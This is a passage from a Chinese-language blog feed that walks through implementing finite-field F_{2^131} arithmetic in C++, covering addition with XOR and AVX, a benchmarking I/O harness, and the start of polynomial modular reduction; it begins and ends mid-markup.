class=\"number\">1</span> - i] != l) &#123;</span><br><span class=\"line\">                    l = <span class=\"number\">0</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">fwrite</span>(&amp;p, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint8_t</span>), Nb * <span class=\"number\">4</span> - l, stdout);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">fwrite</span>(&amp;p, <span class=\"built_in\">sizeof</span>(p), <span class=\"number\">1</span>, stdout);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        len -= Nb * <span class=\"number\">4</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "数学",
                "密码学",
                "密码学"
            ]
        },
        {
            "id": "https://taf.fyi/math/cryptography/finite-field/",
            "url": "https://taf.fyi/math/cryptography/finite-field/",
            "title": "有限域运算",
            "date_published": "2024-10-22T16:00:00.000Z",
            "content_html": "<h1 id=\"准备工作\"><a class=\"anchor\" href=\"#准备工作\">#</a> 准备工作</h1>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h2>\n<p>在有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>F</mi><msup><mn>2</mn><mn>131</mn></msup></msub></mrow><annotation encoding=\"application/x-tex\">F_{2^{131}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.86095em;vertical-align:-0.17762em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.52238em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7463142857142857em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.17762em;\"><span></span></span></span></span></span></span></span></span></span> 上实现运算：</p>\n<ul>\n<li>加法（等价于减法，就是异或）</li>\n<li>取模\n<ul>\n<li>输入：由于只考虑乘法结果作为输入，乘法结果最高只会有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>260</mn></msup></mrow><annotation encoding=\"application/x-tex\">x^{260}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">6</span><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span></span></span></span>，所以输入为 261 位以内的数</li>\n<li>输出：131 位以内的限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>F</mi><msup><mn>2</mn><mn>131</mn></msup></msub></mrow><annotation encoding=\"application/x-tex\">F_{2^{131}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.86095em;vertical-align:-0.17762em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.52238em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7463142857142857em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.17762em;\"><span></span></span></span></span></span></span></span></span></span> 上取模结果</li>\n</ul>\n</li>\n<li>乘法</li>\n<li>平方\n<ul>\n<li>与一般的乘法运算相比较特殊，具有较大优化空间，单独实现</li>\n</ul>\n</li>\n<li>求逆（等价于 “除法”）\n<ul>\n<li>实现一：费马小定理</li>\n<li>实现二：扩展欧几里得</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"数据存储\"><a class=\"anchor\" href=\"#数据存储\">#</a> 数据存储</h2>\n<p>使用  <code>uint64_t[3]</code>  来表示输入、输出数据。</p>\n<p>对于乘法运算，高位需要先保留，然后取模，所以乘法、平方、取模运算的过程中使用到  <code>uint64_t[5]</code> 。</p>\n<p>对于加法运算，由于只需要异或，不需要移位，采用  <code>__m256i</code>  存储和运算。</p>\n<h2 id=\"处理输入输出\"><a class=\"anchor\" href=\"#处理输入输出\">#</a> 处理输入输出</h2>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;chrono&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\">FILE *output, *input;</span><br><span class=\"line\">chrono::time_point&lt;chrono::high_resolution_clock&gt; start_time, end_time;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">    output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;output.bin&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, stdout);</span><br><span class=\"line\">    input = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;input.bin&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, stdin);</span><br><span class=\"line\">    start_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> n;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> op;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>], b[<span class=\"number\">3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(&amp;n, <span class=\"built_in\">sizeof</span>(<span class=\"type\">int32_t</span>), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(n--)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">fread</span>(&amp;op, <span class=\"built_in\">sizeof</span>(op), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">        <span class=\"built_in\">fread</span>(&amp;a, <span class=\"built_in\">sizeof</span>(a), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">        <span class=\"built_in\">fread</span>(&amp;b, <span class=\"built_in\">sizeof</span>(b), <span class=\"number\">1</span>, stdin);</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> c[<span class=\"number\">4</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span>(op)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"built_in\">gf_add</span>(c, a, b);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">gf_mul</span>(c, a, b);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">                <span class=\"built_in\">gf_pow2</span>(c, a);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">                <span class=\"built_in\">gf_inv</span>(c, a);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(&amp;c, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>), <span class=\"number\">3</span>, stdout);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(input);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(output);</span><br><span class=\"line\">    output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;time&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, stdout);</span><br><span class=\"line\">    end_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> ns = std::chrono::<span class=\"built_in\">duration_cast</span>&lt;std::chrono::nanoseconds&gt;(end_time - start_time);</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> us = std::chrono::<span class=\"built_in\">duration_cast</span>&lt;std::chrono::microseconds&gt;(end_time - start_time);</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> ms = std::chrono::<span class=\"built_in\">duration_cast</span>&lt;std::chrono::milliseconds&gt;(end_time - start_time);</span><br><span class=\"line\">    cout &lt;&lt; ns.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; ns&quot;</span> &lt;&lt; endl</span><br><span class=\"line\">         &lt;&lt; us.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; us&quot;</span> &lt;&lt; endl</span><br><span class=\"line\">         &lt;&lt; ms.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; ms&quot;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(output);</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"输入输出可读化\"><a class=\"anchor\" href=\"#输入输出可读化\">#</a> 输入输出可读化</h2>\n<p>为了方便 debug 和检验，编写相关测试脚本如下， <code>test.sh</code> ：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 gen-input.py $&#123;2&#125; $&#123;3&#125;</span><br><span class=\"line\">g++ -Wall -Wextra -Ofast \\</span><br><span class=\"line\">\t\t-march=native -mtune=native \\</span><br><span class=\"line\">\t\t-std=c++20 \\</span><br><span class=\"line\">\t\t-o test solv$&#123;1&#125;.cpp</span><br><span class=\"line\">./test</span><br><span class=\"line\">if (($&#123;3&#125; &lt; 10)); then</span><br><span class=\"line\">\t\tpython3 bin2hex.py</span><br><span class=\"line\">fi</span><br></pre></td></tr></table></figure></p>\n<p>主要思路为  <code>gen-input.py</code>  根据输入参数生成四种运算中的一种  <code>$&#123;1&#125;</code> ，测试次数为  <code>$&#123;2&#125;</code> ，生成一份二进制输入文件  <code>input.bin</code> 。编译代码执行时  <code>$&#123;1&#125;</code>  指定不同源文件，方便切换观察和对比不同实现的性能。最后看测试次数  <code>$&#123;3&#125;</code>  如果超过 10，一般就是大量运算测试性能，那就不必将输出转化为可视化文本了，转化耗时长、文件大而且没有意义；否则就用脚本  <code>bin2hex.py</code>  将程序二进制输出转化为可读文本，十六进制格式显示数字，用于检验运算正确性。</p>\n<blockquote>\n<p>当然输出也可以用 hex editor 查看就行了</p>\n</blockquote>\n<h1 id=\"加法\"><a class=\"anchor\" href=\"#加法\">#</a> 加法</h1>\n<h2 id=\"trival\"><a class=\"anchor\" href=\"#trival\">#</a> Trival</h2>\n<p>最简单，对每一位异或即可。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_add</span><span class=\"params\">(<span class=\"type\">uint64_t</span> c[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> b[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">    c[<span class=\"number\">0</span>] = a_&#123;<span class=\"number\">0</span>&#125; ^ b_&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    c[<span class=\"number\">1</span>] = a_&#123;<span class=\"number\">1</span>&#125; ^ b_&#123;<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\">    c[<span class=\"number\">2</span>] = a_&#123;<span class=\"number\">2</span>&#125; ^ b_&#123;<span class=\"number\">2</span>&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"simd-优化\"><a class=\"anchor\" href=\"#simd-优化\">#</a> SIMD 优化</h2>\n<p>我尝试使用 SIMD 指令集优化，我发现我的电脑和在线测试平台都支持 AVX512，所以尝试用该指令集同时对 8 个  <code>uint64</code>  异或。我可以最多存 8 份加法的输入，但是问题就在于输出的时候，虽然实验测试用例有连续 1M 个加法，但是也有随机顺序的测试，输出的顺序还要保证和输入的顺序一致，这样还要存储大量的结果，考虑到这样会增加更多开销，就没有往这方面做下去。所以最后针对加法，不再使用  <code>uint64_t</code> ，直接读取到  <code>__m256i</code> ，运算并输出：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">fread</span>((<span class=\"type\">uint64_t</span> *)&amp;a_256, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>), <span class=\"number\">3</span>, stdin);</span><br><span class=\"line\"><span class=\"built_in\">fread</span>((<span class=\"type\">uint64_t</span> *)&amp;b_256, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>), <span class=\"number\">3</span>, stdin);</span><br><span class=\"line\"><span class=\"built_in\">gf_add</span>(c_256, a_256, b_256);</span><br><span class=\"line\"><span class=\"built_in\">fwrite</span>((<span class=\"type\">uint64_t</span> *)&amp;c_256, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>), <span class=\"number\">3</span>, stdout);</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a + b</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_add</span><span class=\"params\">(__m256i &amp;c_256, <span class=\"type\">const</span> __m256i &amp;a_256, <span class=\"type\">const</span> __m256i &amp;b_256)</span></span>&#123;</span><br><span class=\"line\">   c_256 = _mm256_xor_si256(a_256, b_256);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"取模\"><a class=\"anchor\" href=\"#取模\">#</a> 取模</h1>\n<p>使用模:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><msup><mi>x</mi><mn>131</mn></msup><mo>+</mo><msup><mi>x</mi><mn>13</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">f(x)=x^{131}+x^{13}+x^{2}+x+1\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9474379999999999em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9474379999999999em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9474379999999999em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span></span></p>\n<h2 id=\"trival-2\"><a class=\"anchor\" href=\"#trival-2\">#</a> Trival</h2>\n<p>首先我尝试了 trival 的做法，那就是对于输入 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">e(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 高于 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>130</mn></msup></mrow><annotation encoding=\"application/x-tex\">x^{130}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span></span></span></span> 的每一位，都进行暴力的除法求出其 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">/</mi><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">e(x)/f(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 的余部，余部加到 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">e(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 中，这样就消去了这一高位。如此至多执行 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>260</mn><mo>−</mo><mn>130</mn><mo>=</mo><mn>130</mn></mrow><annotation encoding=\"application/x-tex\">260-130=130</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">0</span></span></span></span> 次就可以完成求摸。</p>\n<p>显然 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>131</mn></msup></mrow><annotation encoding=\"application/x-tex\">x^{131}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span> 到 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>260</mn></msup></mrow><annotation encoding=\"application/x-tex\">x^{260}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span 